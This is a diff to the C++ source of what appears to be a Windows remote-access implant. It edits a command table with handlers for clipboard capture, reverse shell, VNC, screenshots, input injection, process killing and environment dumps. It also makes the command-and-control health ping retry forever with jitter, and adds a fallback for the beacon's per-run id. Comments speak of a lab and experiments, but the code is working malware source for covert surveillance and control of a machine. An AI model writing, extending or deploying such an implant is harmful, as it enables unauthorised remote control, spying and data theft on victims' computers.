@@ -1647,14 +1647,16 @@ static const CmdEntry kCmdTable[] = {
     { "!clipboard",    true,  HandleClipboard },
     { "!clipboard ",   false, HandleClipboard },
     { "!reverse ",     false, HandleReverse },
-    { "!vnc ",         false, HandleVnc },
+    { "!vnc",          false, HandleVnc },
     { "!browser",      false, HandleBrowser },
     { "!screenshot",   true,  HandleScreenshot },
     { "!live ",        false, HandleLive },
     { "!input ",       false, HandleInput },
     { "!kill ",        false, HandleKillProcess },
     { "!env",          true,  HandleEnvDump },
+    { "!env ",         false, HandleEnvDump },
     { "!getpid",       true,  HandleGetPid },
+    { "!getpid ",      false, HandleGetPid },
     { "exit",          true,  nullptr },
     { "sleep",         true,  nullptr }
 };
@@ -1810,9 +1812,13 @@ std::wstring ExecuteCommand(const std::wstring& cmd, std::wstring& statusOut) {
 
 // =====================================================================
 //  PING C2 — hit /health before starting the beacon loop.
-//  Retries indefinitely with exponential backoff (max 5 min).
+//  Retries indefinitely with exponential backoff (capped at BACKOFF_MAX_SEC).
 //  Returns TRUE on first 200 response.
 // =====================================================================
+// This ladder is deliberately separate from BeaconFailureBackoff below: the
+// pre-session wait is "the operator is still bringing the server up", so it
+// starts at 5s rather than BEACON_MIN (18s), and ramping down to the beacon
+// schedule would just make lab startup slower for no benefit.
 BOOL PingC2() {
     DWORD attempt = 0;
     while (true) {
@@ -1825,10 +1831,13 @@ BOOL PingC2() {
         ++attempt;
         DWORD shift = attempt < 7u ? attempt - 1u : 6u;
         DWORD backoffSec = 5u * (1u << shift);
-        if (backoffSec > 300u) backoffSec = 300u;
+        if (backoffSec > config::BACKOFF_MAX_SEC) backoffSec = config::BACKOFF_MAX_SEC;
         DebugLog(L"PingC2: not reachable (attempt " + std::to_wstring(attempt)
                  + L"), retrying in " + std::to_wstring(backoffSec) + L"s");
-        Sleep(backoffSec * 1000);
+        // Jittered, and it stays unbounded on purpose: WinMain relaunches
+        // ImplantThread on any exit code except 0xDEAD, so returning failure
+        // here would turn an unreachable C2 into an infinite restart loop.
+        JitterSleep(backoffSec, backoffSec + 30);
     }
 }
 
@@ -1865,7 +1874,18 @@ DWORD BeaconLoop(const Session& session) {
     EcdhInit();   // fresh ephemeral keypair per run — key set by first beacon's handshake
     {   // per-run id (8 hex) - lets the operator tell implant runs apart
         unsigned char rb[4] = {};
-        BCryptGenRandom(nullptr, rb, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+        if (!BCRYPT_SUCCESS(BCryptGenRandom(nullptr, rb, 4,
+                                            BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
+            // Bookkeeping, not a security boundary -- but it still has to vary.
+            // Leaving rb zero-filled made every run report id 00000000, so the
+            // operator silently merged distinct runs into one experiment.
+            DWORD tick = GetTickCount();
+            DWORD pid  = GetCurrentProcessId();
+            rb[0] = static_cast<unsigned char>(tick);
+            rb[1] = static_cast<unsigned char>(tick >> 8);
+            rb[2] = static_cast<unsigned char>(pid);
+            rb[3] = static_cast<unsigned char>(pid >> 8);
+        }
         wchar_t tmp[9];
         swprintf_s(tmp, L"%02x%02x%02x%02x", rb[0], rb[1], rb[2], rb[3]);
         g_RunId = tmp;
